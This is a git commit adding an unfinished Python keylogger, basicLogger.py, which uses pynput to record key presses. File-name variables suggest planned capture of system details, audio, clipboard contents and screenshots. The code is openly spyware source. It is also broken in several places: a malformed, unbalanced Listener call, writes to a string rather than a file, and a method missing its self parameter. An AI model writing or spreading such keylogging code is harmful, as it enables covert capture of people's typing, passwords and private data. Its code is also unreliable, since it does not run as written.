080b2d0f6d0fd408573ec612dbb85f9ca1f5286f
gavinlampton <60271526+gavinlampton@users.noreply.github.com>
2022-11-13 12:27:06 -0800

    Tried to add basic keylogger but ran out of time and have to go to work.

---
+++ basicLogger.py
@@ -0,0 +1,33 @@
+import sys
+from pynput import keyboard
+
+system_info = "system.txt"
+audio_info = "audio.wav"
+clipboard_info = "clipboard.txt"
+screenshot_info = "screenshot.png"
+keys_info = "key_log.txt"
+
+class MyListener:
+    def __init__(self, outputLocation):
+        try:
+            self.outLocation = outputLocation
+        except:
+            self.outLocation = sys.stdout
+
+    def on_press(self, key):
+        self.outLocation.write(key)
+
+
+    def on_release(key):
+        return key != keyboard.Key.enter
+
+test = MyListener(keys_info)
+
+with keyboard.Listener(keyboard.Listener(on_press=test.on_press, on_release=test.on_release) as listener:
+    try:
+        listener.join()
+    except Exception as e:
+        print('{0} exception happened...'.format(e.args[0]))
+
+
+inp = input('Please type:\n')
